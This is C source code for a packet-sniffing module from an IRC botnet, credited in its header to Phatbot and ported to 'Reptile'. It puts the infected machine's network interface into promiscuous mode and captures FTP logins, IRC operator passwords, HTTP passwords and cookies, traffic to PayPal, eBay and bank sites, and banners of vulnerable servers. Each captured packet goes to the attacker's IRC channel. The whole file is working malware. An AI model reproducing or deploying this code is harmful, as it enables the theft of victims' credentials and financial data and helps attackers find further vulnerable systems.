//|				_________       __________     ___________		   |//
//|				\_   ___ \______\______   \ ___\__    ___/		   |//
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |//
//|				\     \___|  |_> >    |   (  <_> )    |			   |//
//|				 \______  /   __/|______  /\____/|____|			   |//
//|						\/|__|          \/						   |//

/*
	Original Sniffer code from Phatbot-0.2.3-fix
	Ported to Reptile by someone you probably don't know.
*/
#include "includes.h"
#include "functions.h"

#ifndef NO_SNIFFER
in_addr &to_in_addr(unsigned long lHost)
{
	static in_addr ina;
	ina.s_addr=lHost;
	return ina;
}

BOOL IsSuspiciousBot(const char *szBuf, const char *szNick)
{
	//if(strstr(szBuf, "Bot sniff")) return FALSE;
	if(strstr(szBuf, "bot sniff")) return FALSE;
	if(strstr(szBuf, servers[curserver].chan)) return FALSE;
	if(strstr(szBuf, szNick)) return FALSE;
	if(strstr(szBuf, "JOIN #")) return TRUE;
	if(strstr(szBuf, "302 ")) return TRUE;
	if(strstr(szBuf, "366 ")) return TRUE;
	if(strstr(szBuf, ":.login")) return TRUE;
	return FALSE;
}

BOOL IsSuspiciousIRC(const char *szBuf, const char *szNick)
{
	if(strstr(szBuf, "irc sniff")) return FALSE;
	if(strstr(szBuf, szNick)) return FALSE;
	if(strstr(szBuf, servers[curserver].chan)) return FALSE;
	if(strstr(szBuf, "you are now an irc operator")) return TRUE;
	if(strstr(szBuf, "You are now an IRC Operator")) return TRUE;
	if(strstr(szBuf, "OPER ")) return TRUE;
	if(strstr(szBuf, "oper ")) return TRUE;
	if(strstr(szBuf, "NICK ")) return TRUE;
	return FALSE;
}

BOOL IsSuspiciousFTP(const char *szBuf, const char *szNick)
{
	if(strstr(szBuf, "ftp sniff")) return FALSE;
	if(strstr(szBuf, szNick)) return FALSE;
	if(strstr(szBuf, servers[curserver].chan)) return FALSE;
	if(strstr(szBuf, "user ")) return TRUE;
	if(strstr(szBuf, "pass ")) return TRUE;
	return FALSE;
}

BOOL IsSuspiciousHTTP(const char *szBuf) {
	if(strstr(szBuf, "HTTP sniff")) return FALSE;
	if(strstr(szBuf, servers[curserver].chan)) return FALSE;
    if(strstr(szBuf, "password")) return TRUE;
	if(strstr(szBuf, "paypal.com")) return TRUE;
	if(strstr(szBuf, "e-gold.com")) return TRUE;
	if(strstr(szBuf, "moneybookers.com")) return TRUE;
	if(strstr(szBuf, "alertpay.com")) return TRUE;
	if(strstr(szBuf, "ebay.com")) return TRUE;
	if(strstr(szBuf, "americabank.com")) return TRUE;
	if(strstr(szBuf, "* bank *")) return TRUE;
	if(strstr(szBuf, "Set-Cookie:")) return TRUE;
	return FALSE;
}
BOOL IsSuspiciousVULN(const char *szBuf)
{
	if(strstr(szBuf, "VULN sniff")) return FALSE;
	if(strstr(szBuf, servers[curserver].chan)) return FALSE;
	if(strstr(szBuf, "OpenSSL/0.9.6")) return TRUE;
	if(strstr(szBuf, "Serv-U FTP Server")) return TRUE;
	if(strstr(szBuf, "OpenSSH_2")) return TRUE;
	return FALSE;
}

DWORD WINAPI CSniffer(LPVOID param)
{
	NTHREAD sniffer = *((NTHREAD*)param);
	NTHREAD *sniffers = (NTHREAD *)param;
	sniffers->gotinfo = TRUE;
	IRC* irc=(IRC*)sniffer.conn;
	int sock;
	sockaddr_in addr_in;
	hostent *hEnt;
	IPHEADER *ipHeader;
	TCPHEADER *tcpHeader;
	char *szPacket;
	char szName[255]={0};
	unsigned long lLocalIp;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=0;
	addr_in.sin_addr.s_addr=0;
	fgethostname(szName, sizeof(szName));
	hEnt=fgethostbyname(szName);
	memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
	addr_in.sin_addr.s_addr=lLocalIp;

	sock=fsocket(AF_INET,SOCK_RAW,IPPROTO_IP); 
	if(sock==INVALID_SOCKET)
	{
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}

	if(fbind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR)
	{
		fclosesocket(sock);
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}
	int optval=1;
	DWORD dwBytesRet;
	if(fWSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR)
	{
		fclosesocket(sock);
		clearthread(sniffer.threadnum);
		ExitThread(0);
	}
	char szCurNick[MAX_NICKLEN];
	char szRecvBuf[65535];
	ipHeader=(IPHEADER*)szRecvBuf;
	int iRead;

	strcpy(szCurNick,irc->current_nick());
	while(irc->is_connected())
	{
		// Clear the buffer
		ZeroMemory(szRecvBuf,sizeof(szRecvBuf));
		iRead=0;
		
		// Read the raw packet
		iRead=frecv(sock, szRecvBuf, sizeof(szRecvBuf), 0);

		// Process if its a TCP/IP packet
		if(ipHeader->proto==6)
		{
			tcpHeader=(TCPHEADER*)(szRecvBuf+sizeof(*ipHeader));
			int iSrcPort, iDestPort;
			char szSrcHost[2048], szDestHost[2048];
			iSrcPort=fntohs(tcpHeader->th_sport);
			iDestPort=fntohs(tcpHeader->th_dport);

			if(iSrcPort !=110 && iSrcPort!=25 && 
			   iDestPort !=110 && iDestPort!=25 &&
			   iSrcPort!=servers[curserver].port && iDestPort!=servers[curserver].port)
			{
				sprintf(szSrcHost, "%s", finet_ntoa(to_in_addr(ipHeader->sourceIP)));
				sprintf(szDestHost, "%s", finet_ntoa(to_in_addr(ipHeader->destIP)));

				szPacket=(char*)(szRecvBuf+sizeof(*tcpHeader)+sizeof(*ipHeader));
				for(int i=0; i<strlen(szPacket); i++) {
					if(szPacket[i]=='\r') szPacket[i]='\x20';
					if(szPacket[i]=='\n') szPacket[i]='\x20'; }

				if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousBot(szPacket,szCurNick))
				{
					irc->privmsg(sniffer.target,"Bot sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket);
				}

				else if(iSrcPort!=80 && iDestPort!=80 && IsSuspiciousIRC(szPacket,szCurNick))
				{
					irc->privmsg(sniffer.target,"IRC sniff \"%s:%d\" to \"%s:%d\": - \"%s\"", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
				}

				else if((iSrcPort==21 || iDestPort==21) && IsSuspiciousFTP(szPacket,szCurNick))
				{
					irc->privmsg(sniffer.target,"FTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
				}

				else if(IsSuspiciousHTTP(szPacket))
				{
					irc->privmsg(sniffer.target,"HTTP sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
				}

				else if(IsSuspiciousVULN(szPacket))
				{
					irc->privmsg(sniffer.target,"VULN sniff \"%s:%d\" to \"%s:%d\": - \"%s\"\n", szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
				}
			}
		}
	}
	fclosesocket(sock);
	clearthread(sniffer.threadnum);
	ExitThread(0);
}
#endif